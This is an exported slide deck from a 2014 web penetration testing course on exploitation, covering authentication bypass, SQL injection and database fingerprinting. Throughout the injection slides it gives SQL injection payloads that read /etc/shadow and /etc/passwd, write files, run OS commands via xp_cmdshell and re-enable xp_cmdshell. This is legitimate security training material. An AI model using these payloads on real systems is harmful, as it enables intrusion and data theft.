<!-- Automatically generated by Export-PptxToGitPITCHME.ps1
https://gist.github.com/valdeza/27845c35d14c833af63e449e5f055204 -->

<!-- Slide 1 -->
<!--[Rectangle 2]-->
Web Penetration Testing and Ethical Hacking  
Exploitation

<!--[TextBox 4]-->
Copyright 2014, Secure Ideas
Version 1Q14

<!--[TextBox 2]-->
Professionally Evil   
Web Application 
Penetration Testing   
101.1

Note:
<!--[Rectangle 7]-->
1

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Web applications are a major point of vulnerability in organizations today. Web app holes have resulted in the theft of millions of credit cards, major financial and reputational damage for hundreds of enterprises, and even the compromise of thousands of browsing machines that visited web sites altered by attackers. 

In the next few days, you'll learn the art of exploiting web applications so you can find flaws in your enterprise's web apps before the bad guys do. Through detailed, hands-on exercises and these materials, you will be taught the four-step process for web application penetration testing. You will inject SQL into back-end databases, learning how attackers exfiltrate sensitive data. You will utilize Cross Site Scripting attacks to dominate a target infrastructure in our unique hands-on laboratory environment. And, you will explore various other web app vulnerabilities in-depth, with tried-and-true techniques for finding them using a structured testing regimen. As well as the vulnerabilities, you will learn the tools and methods of the attacker, so that you can be a powerful defender.

---

<!-- Slide 2 -->
<!--[Rectangle 2]-->
Course Outline

<!--[Rectangle 3]-->
- Day 1: Attacker's View, Pen-Testing and Scoping
- Day 2: Recon & Mapping
- Day 3: Server-Side Vuln Discovery
- Day 4: Server-Side Vuln Discovery
- **Day 5: Exploitation**
- Day 6: Capture the Flag

<!--[Right Arrow 3]-->

Note:
<!--[Rectangle 7]-->
2

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
In this class, we will learn the practical art of web application penetration testing. 

On Day 1, we will examine the attacker's perspective, and learn why it is important for us to build and deploy web application with the attacker's perspective in mind. We will also cover the pieces of a penetration test and how to scope and prepare for one.  Finally, we will explore the methodology that will be covered through the rest of class.
 
During Day 2, we will step through the process that successful attackers use to exploit applications, focusing specifically on the reconnaissance and mapping stages of the process.  This will give us the foundation we need to later control the application.

On Day 3, we will build upon that foundation and start discovering the various weaknesses within the applications.  As penetration testers, we will map out the attack vectors that we are going to use against this application. These discoveries will be the basis for the exploitation phase.

On Day 4, we will continue our discovery focusing on client side components such as Flash and Java.  We will also explore the client-side scripting in use within our applications.

On Day 5, we will launch the attacks that we planned and created during the previous three sections. We will also cover the next steps for students and where they should go from here.

On Day 6, we will be performing a web application pen-test within a capture the flag event.

---

<!-- Slide 3 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
- *** ***<span style="text-decoration: underline;">***Exploitation ***</span>
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	-  MonkeyFist Exercise
-  Putting It Together
	-  Attack Scenario
	-  Next Steps

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Today we will move to the final step in our methodology, exploitation.  We will explore the different types of flaws and how they can be exploited to further our access within the application.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 4 -->
<!--[Rectangle 2]-->
Exploitation

<!--[Rectangle 3]-->
- Last step of the methodology
	- Reporting is part of each step
- Using the previous steps we try to expand our foothold
- Care needs to be taken to not cause larger issues
	- DoS attacks 
	- Opening holes for other attackers

Note:
<!--[Rectangle 7]-->
4

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Now we are going to explore the last step of the attack process, exploitation. We will build on the information we have discovered in the last three steps and expand the foothold we have in the application.  Today we will explore some of the more advanced attacks possible through a web site.  Enjoy!

---

<!-- Slide 5 -->
<!--[Rectangle 2]-->
Previous Steps

<!--[Rectangle 3]-->
- The previous steps have planned the attacks in this step
- Gained information used here
- Discovered vulnerabilities we will exploit

Note:
<!--[Rectangle 7]-->
5

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
As a review, over the last three steps we have performed reconnaissance to plan our attack. Gained information on how the application was put together and discovered various vulnerabilities.  This is the foundation we take into today.

---

<!-- Slide 6 -->
<!--[Rectangle 2]-->
Expand the Foothold

<!--[Rectangle 3]-->
- We use this step to expand our foothold
- Pivot through the application to find other flaws
- Launch further attacks
- Enables us to better understand the risk to the organization

Note:
<!--[Rectangle 7]-->
6

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
During exploitation, we are able to expand the foothold the vulnerability exposes within the application.  By performing various exploits, we are able to pivot through this flaw and gain either further access or discover other flaws.  We can then launch further attacks, either into the tested application or deeper into the network.

This exploitation allows us to better understand the risks and possibilities the vulnerabilities expose.

---

<!-- Slide 7 -->
<!--[Rectangle 2]-->
Exploits

<!--[Rectangle 3]-->
- We are going to explore various exploits
- Specifically focused on three categories
	- Bypass exploits
	- Injection exploits
	- Session exploits

Note:
<!--[Rectangle 7]-->
7

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
We've talked about many types of exploits over the past few days, but we will not discuss them all today. During the discovery phase, we validated that flaws existed by actually sending malicious traffic. For certain types of attacks, discovery of the flaw is enough of a validation. Cross Site Request Forgery is one example- once we validate that a site is vulnerable, further exploitation does not prove anything more or gain us further access. 

Today, we will focus on three categories of exploits: authentication bypass, SQL injection, and session hijacking (with relation to XSS). 

---

<!-- Slide 8 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	- *** ***<span style="text-decoration: underline;">***Authentication Bypass***</span>
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this section we will discuss authentication bypass and how it can be exploited.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 9 -->
<!--[Rectangle 2]-->
Authentication Bypass

<!--[Rectangle 3]-->
- This flaw allows us to access restricted content without authentication
- Provides access to various items based on the flaw
	- Access reserved functionality such as administrative consoles
	- Access to accounts other than our own
- Exploits the lack of authentication verification within the application
- We gain access to more of the application

Note:
<!--[Rectangle 7]-->
9

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
As we've discussed previously, authentication bypass is when the attacker can access resources which require authentication without actually authenticating.   This allows the attacker to gain access to portions of the application or data the target is trying to protect.  Depending on the exposed portions, this can be a very critical issue in a web application.

When a tester finds an authentication bypass issue, they need to determine what it provides access too.  Can they get to the whole site or just a portion of it.

---

<!-- Slide 10 -->
<!--[Rectangle 2]-->
Bypass Methods

<!--[Rectangle 3]-->
- Use site maps and access resources directly
- Manually
	- Access pages with a browser
	- Also look at URL parameters
		- Keys and IDs
- Scripts
	- Scripts make this easier
	- Can brute force page names
	- Simple iteration
	- Uses previous results

Note:
<!--[Rectangle 7]-->
10

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
There are two ways which authentication can be bypassed. One method is to manually access portions of the site by reviewing the site map and going to those pages directly instead of following the menu flow. The other way is to run scripts to which brute-force directory and file listings in an attempt to find valid filenames. 

Manually walking through the application is a simple way to abuse this.  Use the application map from the previous steps.  In gathering that data, you should have found keys and ids used to reference pages.  These are the focus of this attack.

Of course scripting is the best way to abuse this flaw.  Simply write a script to brute force the ids and keys found.  You can also brute force guess page names to find pages that allow direct access when they shouldn't.


---

<!-- Slide 11 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	- *** ***<span style="text-decoration: underline;">***Authentication Bypass Exercise***</span>
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This next section will cover the bypass attacks and how to use them within your test.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 12 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
- *** ***<span style="text-decoration: underline;">***Injection Flaws***</span>
	-  SQL Injection
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This next section will cover the injection attacks and how to use them within your test.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 13 -->
<!--[Rectangle 2]-->
Injection Flaws

<!--[Rectangle 3]-->
- Attackers inject code into some form of user input, with the goal of an interpreter somewhere processing it
- Examples include:
	- SQL Injection
		- Targets the backend data store
	- Command Injection
		- Targets the operating system
	- Code Injection
		- Targets the application
	- Cross Site Request Forgery (CSRF)
		- Targets the trust an application has in  
 the user
	- Cross Site Scripting (XSS)
		- Targets the clients of an application
	- HTTP Response Splitting
		- Enhances other attacks

<!--[AutoShape 4]-->
Web
Server

<!--[Line 5]-->

<!--[AutoShape 7]-->
DB

<!--[Line 8]-->

<!--[AutoShape 10]-->
Browser

<!--[Freeform 39]-->

<!--[Text Box 40]-->
**Command  
Injection   
and Code   
Injection**

<!--[Freeform 41]-->

<!--[Text Box 42]-->
**SQL  
Injection**

<!--[Freeform 43]-->

<!--[Text Box 44]-->
**CSRF,**
**XSS, and HTTP Response Splitting**

<!--[Line 46]-->

<!--[Group 34]-->

Note:
<!--[Rectangle 7]-->
13

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Injection flaws are a common flaw.  They are flaws where the attacker is able to injection content that the application uses.  The basic issue is that the application is trusting the attacker's content and using it without filtering or with bypass-able filtering.

When many people look at web security, injection flaws are the ones that they focus the most on.  The flaws are easier for many people to understand the risk they open an organization up too.

---

<!-- Slide 14 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	- *** ***<span style="text-decoration: underline;">***SQL Injection***</span>
	-  File Handling with SQL Injection
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
SQL injection is the first of the input flaws that we will explore in greater detail.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 15 -->
<!--[Rectangle 2]-->
SQL Injection Example

<!--[Rectangle 3]-->
- Input is passed directly to query
- Without filtering or with poor filtering
- User enters:
	' or 1=1 --
- Query becomes
	select user from users where login='' or 1=1 --'
- This is the traditional example

Note:
<!--[Rectangle 7]-->
15

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
We have already talked quite a bit about SQL injection.  The key point to remember is that user input is passed directly to a query with little or no filtering.  Now let's start looking at real examples of how to use it.  

The ' terminates the string in the original.
The or 1=1 returns true for every row.
The -- comments out the remainder of the query that the application was going to place there.

---

<!-- Slide 16 -->
<!--[Rectangle 2]-->
Always True

<!--[Rectangle 3]-->
- Another misconception is that 1=1 is a magic string
	- Its not!
- Any always true value  is valid
	- 1<2
	- 'Brenna'='Brenna'
- These exploit strings  are used to return entire data sets

Note:
<!--[Rectangle 7]-->
16

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
There exists a common misunderstanding that 1=1 is a magic value, because it is so often included as part of SQL injection input examples.  We need to understand that any true value in this place works as well.  As a matter of fact, using a different value may allow us to bypass simple filtering.

---

<!-- Slide 17 -->
<!--[Rectangle 2]-->
SQL Review

<!--[Rectangle 3]-->
- Common SQL Commands
	- Select
		- Retrieve data
	- Insert
		- Creates new data in database
	- Update
		- Modifies existing data
	- Delete
		- Removes data from the database
	- Union
		- Combines the results of two queries

Note:
<!--[Rectangle 7]-->
17

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Most of the work done within SQL injection will use one of these SQL commands.  Using these along with database specific functions, we can control most if not all of the data we have access to through the application.

	Select
		Retrieve data
	Insert
		Creates new data in database
	Update
		Modifies existing data
	Delete
		Removes data from the database
	Union
		Combines the results of two queries

---

<!-- Slide 18 -->
<!--[Rectangle 2]-->
Insert/Union Notes

<!--[Rectangle 3]-->
- Attacker does not know schema or the actual query
	- Unless through other flaws
- We need to guess the number of fields
	- Add static fields till the query succeeds
	- Foo');--
	- Foo',1);--
	- Foo',1,2);--

Note:
<!--[Rectangle 7]-->
18

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
The format for an "insert" command is:
	INSERT into tablename (field1, field2, field3) VALUES ('value1', 'value2', 'value3')
If the injection targets value1, then by inputting foo',1,1)-- the query would end up as:
	INSERT into tablename (field1, field2, field3) VALUES ('foo',1, 1)--'','') 
	
	Note: Anything after the --  is what the application we are injecting into adds to the query.  That is why we use the -- to comment it out.
	
Note: SQL keywords are not case-sensitive. We are only using uppercase here to make the syntax easier to read.

---

<!-- Slide 19 -->
<!--[Rectangle 2]-->
Fingerprinting the Database (1)

<!--[Rectangle 3]-->
- As we mentioned RDBMS' have differences in the SQL
- We can use these differences to determine the database type if the error message doesn't
- Common, non-ANSI SQL statements (e.g. year)
	- MS SQLServer
		- year('2007-12-01') 
	- Oracle
		- EXTRACT(YEAR FROM '2007-12-01')   ***or***   to_char('2007-12-01','YYYY')
	- PostgreSQL
		- date_part('year', '2007-12-01')
	- SQLite
		- substr('2007-12-01',1,4)
	- MySQL
		- year('2007-12-01')

Note:
<!--[Rectangle 7]-->
19

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Each database vendor extends the ANSI-SQL language to make their product "stand out" among the rest. This is useful for us because it can help us figure out the database type.  The "year()" function is but one example of many functions which can help identify the type of database in use.  

By fingerprinting the database we are able to know what further exploit queries can be potentially used. 


---

<!-- Slide 20 -->
<!--[Rectangle 2]-->
Fingerprinting the Database (2)

<!--[Rectangle 3]-->
- A second option to fingerprint the server is where it stores its control data
- Master database and schema tables
	- MS SQLServer
		- SELECT name  FROM master..sysobjects WHERE xtype = 'U';
	- Oracle
		- SELECT table_name  FROM user_tables;
	- PostgreSQL
		- SELECT relname  FROM pg_class ;
	- MySQL
		- SELECT Select_priv FROM mysql.db;

Note:
<!--[Rectangle 7]-->
20

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Each database maintains information about itself inside system databases and tables. Note that some examples consult the system meta-data database tables while others access information about the "current" database.

These queries are built to help fingerprint what the RDBMS is.  As we look into the exploit techniques next, this will help decide which attacks can work.

---

<!-- Slide 21 -->
<!--[Rectangle 2]-->
Attack Ideas

<!--[Rectangle 3]-->
- Many different types of attacks are possible
	- Bypass authentication
	- Retrieve records
	- Modify transactions
	- Add users
	- Delete event logs
	- Write Files

Note:
<!--[Rectangle 7]-->
21

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Some of the typical attack ideas are modifying data within the database.  For example, we could retrieve records or modify transactions.  We could also add users to an application or delete its event logs to hide our tracks.  It is only limited by our imagination.

Keep in mind that these ideas are the typical attacks but are also broad categories.  As we explore exploits, keep in mind these abilities!

---

<!-- Slide 22 -->
<!--[Rectangle 2]-->
Extend our Attack

<!--[Rectangle 3]-->
- Modifying data is nice
- But what else is available to us during our test
- We will now explore various other attacks
- The following methods depend on database types

Note:
<!--[Rectangle 7]-->
22

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
It is nice to be able to modify data and retrieve data sets.  But what else can we do?  We will explore further in the next few slides.  Remember that these attacks are dependent upon database version.  For example, the attack for reading files is different for MySQL and MSSQL.

---

<!-- Slide 23 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	- *** ***<span style="text-decoration: underline;">***File Handling with SQL Injection***</span>
	-  OS Interaction with SQL Injection
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Reading and Writing to Files with SQL injection is the first advanced attack we will explore.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 24 -->
<!--[Title 1]-->
# File Handling


<!--[Content Placeholder 2]-->
- An excellent exploit is reading and writing files
	- Provides information and pivot capabilities
- Database servers are the crown jewels
	- They contain much of the sensitive data
- Different RDBMS' provide different levels of reading and writing
	- If at all

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
File handling is a common exploit we can take after finding a SQL injection flaw.  As an attacker, the SQL injection flaw provides access, through the RDBMS, to the most sensitive information many organizations have.  It allows us to grab that data or pivot further into the network.

This depends much on the functionality the RDBMS exposes and provides.  Some are easier than others.  We will look at a few of them next.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 25 -->
<!--[Rectangle 2]-->
Read File (MySQL)

<!--[Rectangle 3]-->
- Read files through SQL injection
- Uses the **load_file()** function
	- **load_file **can be part of a query
		- We need to use a UNION to make it work
	- Inject   
**' union select load_file('/etc/shadow'),1 #**
- **load data** reads files into tables
	**load data infile 'c:\filename' into table temp**

Note:
<!--[Rectangle 7]-->
25

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
MySQL has two methods of loading files into a database.  The first is the load_file function.  This function will read a file and make it part of a query using a UNION statement.  The second is the "load data" which will load the contents of a file into a table of its own.

	To exploit this, we would inject the string **' union select load_file('/etc/shadow'),1 # **in the input parameter.  This reads the shadow file from the server.****
  

---

<!-- Slide 26 -->
<!--[Rectangle 2]-->
Write File (MySQL)

<!--[Rectangle 3]-->
- Writing files allow us to dump data to the file system
- Use the INTO directive
	**SELECT * FROM table INTO DUMPFILE '/result';  
**or
	**SELECT * FROM table INTO OUTFILE '/result'; **
	
- Can write anywhere MySQL has permissions
	- Can you say root?          

Note:
<!--[Rectangle 7]-->
26

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Using the Select into command, an attacker can write a file into the server's file system.  This is typically only restricted by the permissions of MySQL.  Sadly MySQL runs as root quite often.

Keep in mind that outfile and dumpfile are interchangeable.  Both work within MySQL and so it becomes either a personal choice or on the rare chance that a filter is blocking one or the other. 

---

<!-- Slide 27 -->
<!--[Rectangle 2]-->
Read/Write File (Oracle)

<!--[Rectangle 3]-->
- Oracle uses an Oracle package to read and write files
- Named utl_file
	- Keep in mind that it may not be available to our permission level
- Uses ora.ini to set accessible paths
- Syntax is in the notes

Note:
<!--[Rectangle 7]-->
27

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Oracle uses a set of stored procedures called "utl_file" to carry out file operations on local and remote filesystems. Below is an example of how to use utl_file to read the first line of a file (sample1.txt):

declare  
f utl_file.file_type;  
s varchar2(200);  
begin  
f := utl_file.fopen('SAMPLEDATA','sample1.txt','R');  
utl_file.get_line(f,s);  
utl_file.fclose(f);  
dbms_output.put_line(s);  
end;  
/ 

---

<!-- Slide 28 -->
<!--[Rectangle 2]-->
Read File (MS SQL)

<!--[Rectangle 3]-->
- MS SQL uses **Bulk Insert**
- Reads file that is specified
- Inserts it into a table
	**BULK INSERT table FROM ****'****c:\boot.ini****'**** --**
- Typically we will create an empty table to store this data first**	**

Note:
<!--[Rectangle 7]-->
28

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Microsoft SQL uses the BULK INSERT command to read a file into a table, similar to the load data command from MySQL.  This command will read the file and insert it into rows in the table.

Microsoft SQL cannot natively write to a file.  The next slide will give two examples of ways to do this.

---

<!-- Slide 29 -->
<!--[Rectangle 2]-->
Write File (MS SQL)

<!--[Rectangle 3]-->
- No native way within T-SQL to write to files
- Two options are available
- We can use xp_cmdshell to call osql.exe
	- Requires username and password
	- Probably easier ways exist
- Can create a stored procedure
	- Requires permission to create objects
	- Uses the VBS FileSystem Object
	- Example in notes

Note:
<!--[Rectangle 7]-->
29

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
CREATE PROCEDURE sp_AppendToFile(@FileName varchar(255), @Text1 varchar(255)) AS   
DECLARE @FS int, @OLEResult int, @FileID int   
  
EXECUTE @OLEResult = sp_OACreate 'Scripting.FileSystemObject', @FS OUT   
IF @OLEResult <> 0 PRINT 'Scripting.FileSystemObject'   
  
--Open a file   
execute @OLEResult = sp_OAMethod @FS, 'OpenTextFile', @FileID OUT, @FileName, 8, 1   
IF @OLEResult <> 0 PRINT 'OpenTextFile'   
  
--Write Text1   
execute @OLEResult = sp_OAMethod @FileID, 'WriteLine', Null, @Text1   
IF @OLEResult <> 0 PRINT 'WriteLine'   
  
EXECUTE @OLEResult = sp_OADestroy @FileID   
EXECUTE @OLEResult = sp_OADestroy @FS 

---

<!-- Slide 30 -->
<!--[Rectangle 2]-->
Read/Write to a File (PostGRES)

<!--[Rectangle 3]-->
- Uses the Copy SQL command
- **COPY mydata FROM '/etc/passwd';** 
	- Inserts data into the table specified
- **COPY mydata TO '/tmp/data'; **
	- Writes data to a file

Note:
<!--[Rectangle 7]-->
30

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
PostGRES can read data from the file system using the Copy from syntax.  Typically an attacker would create the table first, then insert the data they were interested in.  After selecting the table using another query, they would drop the temporary table.

---

<!-- Slide 31 -->
<!--[Rectangle 1040]-->

<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View,   
Pen-Testing & Scoping
- Recon & Mapping
- Server-Side Vuln Discovery
- Server-Side Vuln   
Discovery
- <span style="text-decoration: underline;">***Exploitation***</span>
- Capture the Flag

<!--[Rectangle 1043]-->
-  Exploitation 
-  Bypass Flaws
	-  Authentication Bypass
	-  **Authentication Bypass Exercise**
-  Injection Flaws
	-  SQL Injection
	-  File Handling with SQL Injection
	- *** ***<span style="text-decoration: underline;">***OS Interaction with SQL Injection***</span>
	-  **sqlmap Exercise**
	-  Port Scanning with SQL Injection
	-  File Injection with SQL Injection
	-  Prepared Injection Files
	- ** Prepared Files Exercise**
	-  Blind SQL Injection
	- ** Blind SQL Injection Exercise**
	-  XSS
	- ** Persistent XSS Exercise**
	-  Advanced XSS
	- ** Durzosploit Exercise**
	-  XSS Frameworks
		-  BeEF
		- ** BeEF Exercise**
	-  Limiting XSS targets
-  Session Flaws
	-  Session Fixation
	-  XSRF
	- ** MonkeyFist Exercise**
-  Putting It Together
	-  Attack Scenario
	-  Next Steps
	-  Conclusions

<!--[Freeform 1044]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We will now explore ways to interact with the OS on the DB server.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 32 -->
<!--[Rectangle 2]-->
OS Interaction (MSSQL)

<!--[Rectangle 3]-->
- MS SQL allows OS interaction
- It uses the infamous xp_cmdshell
	- Stored procedure that runs OS commands
- Data is not sent to client
- Further queries are required to retrieve the results

Note:
<!--[Rectangle 7]-->
32

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
A well-known default stored procedure is "xp_cmdshell." This allows us to use MSSQL server to run operating system commands.  The results are not displayed, so in the next slide we will discuss how to retrieve the results.

---

<!-- Slide 33 -->
<!--[Rectangle 2]-->
OS Interaction Example

<!--[Rectangle 3]-->
- Four queries are used to run the command and  retrieve the results
	- The would be injected individually
- First injection:
	**'; exec master.xp_cmdshell  'route print > results.txt' --**
- Second injection:
	**'; Create TABLE results (outp varchar(5000)); --**
- Third injection:  
**'; BULK INSERT results FROM 'results.txt' with (rowterminator = "\n\n\n\n"); --******
- Fourth injection:
	**' and 1 in (select outp from results) --**

Note:
<!--[Rectangle 7]-->
33

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
This example prints the local route table and then retrieves it.  As attackers, this would provide us with important internal network information.  We can then use this information to for further attacks.

We need to run four queries.  The injections would be:

First injection:
	**'; exec master.xp_cmdshell  'route print > results.txt' --**
Second injection:
	**'; Create TABLE results (outp varchar(5000)); --**
Third injection:  
           **'; BULK INSERT results FROM 'results.txt' with (rowterminator = "\n\n\n\n"); --**
Fourth injection:
	**' and 1 in (select outp from results) --**

---

<!-- Slide 34 -->
<!--[Rectangle 2]-->
Re-enabling xp_cmdshell

<!--[Rectangle 3]-->
- xp_cmdshell is disabled by default
- This is on modern MS SQL servers
	- 2005 and later
- Of course we can re-enable it
**EXEC sp_configure 'show advanced options', 1;**
**RECONFIGURE;**
**EXEC sp_configure 'xp_cmdshell', 1;**
**RECONFIGURE;**

Note:
<!--[Rectangle 7]-->
34

<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
By default, Microsoft has started disabling xp_cmdshell.  This started in the 2005 version of Microsoft SQL Server.  But if you have the correct permissions, you are able to re-enable the stored procedure, since it exists.  These four commands will set this up for you:

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;

---

<!-- Slide 35 -->
<!--[Rectangle 2]-->
OS Interaction (PostGRES)

